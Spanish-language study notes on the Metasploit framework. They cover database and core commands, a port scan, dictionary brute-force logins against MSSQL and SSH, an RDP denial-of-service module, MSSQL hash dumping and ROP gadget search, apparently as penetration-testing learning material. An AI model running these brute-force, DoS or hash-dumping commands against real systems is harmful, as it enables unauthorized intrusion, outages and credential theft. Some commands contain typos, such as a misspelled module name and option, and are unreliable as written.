
Generar mapa mental con cmaptools


**Nivel de base de datos**

db_status
hosts
services
db_import
creds
db_nmap <IP> ; db_nmap -p 3389 <IP>
db_import <random.nessus>  (Using nmap <IP> -oX scan.xml)  Importar procesos de scanning previos
vulns


hosts -h (Borrar la base de datos)

INVESTIGAR DB hosts|services|creds estan relacionados


**Nivel de base de core**

search: buscar algo dentro de todo el framework
show: mostrar opciones (options)
use: Para utilizar un modulo
set: asignar parametros RHOSTS, PORTS ..
run
unset
back
banner
info
check
exploit
sessions
jobs
background


## Ejecutar un modulo auxiliar

    use auxiliary/scanner/portscan/tcp
    show options 10.0.0.5
    set RHOSTS 10.0.0.5
    set PORTS 22,23,25,110,21,3389,1433
    run

**Upgrade to layer-2 VPN pivoting with MEtasploit PRO**






## Ataque diccionario utilizando diccionarios

nano dixionario.txt

use auxiliary/scanner/mssql/mssql_login
show options
set USERNAME sa
set PASSFILE_FILE <path>
set RHOSTS <IP>
run 

Empieza a hacer una combinacion del sa contra todo lo que haya en ese diccionario.
Sino funciona setear otro diccionario y asi sucesivamente.


use auxiliary/scanner/ssh/ssh_login
set PASS_FILE <path>
set RHOSTS <IP>
set USERNAME root
show options




## DOS utilizando modulos auxiliares

> Mandar un paquete corrupto

use auxiliary/dos/windows/rdp/ms12_020_maxchannelids




## Hashdumping utilizando modulos auxiliares

> Volcar hashes mssql, hashdumping <> password cracking. Es decir obtener los hashes.

use auxiliary/scanner/mssql/msssql_hashdump
show options
set PASSWORD
set RHOSTS


Find ROP gadgets
msfrop -v -s "pop ecx" msvcrt.dll
https://www.oreilly.com/library/view/mastering-metasploit/9781788990615/7ca82644-c8ca-4234-beb3-fe7fb3cd8f55.xhtml